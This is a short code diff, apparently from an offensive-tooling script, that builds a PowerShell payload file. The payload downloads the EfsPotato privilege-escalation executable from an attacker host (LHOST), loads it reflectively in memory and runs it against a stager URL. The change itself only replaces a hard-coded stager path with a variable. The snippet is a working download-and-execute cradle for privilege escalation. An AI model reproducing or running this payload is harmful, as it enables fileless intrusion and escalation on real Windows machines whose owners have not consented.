@@ -647,7 +647,7 @@ o = f"""
 $u="http://{ak.LHOST}/EfsPotato.exe"
 $b=(New-object system.net.webclient).DownloadData($u)
 $a=[System.Reflection.Assembly]::Load($b)
-[EfsPotato.Program]::Main("http://{ak.LHOST}/sc")
+[EfsPotato.Program]::Main("{ak.STAGER_URL}")
 """
 
 ak.write_file("output_efs.txt", o)
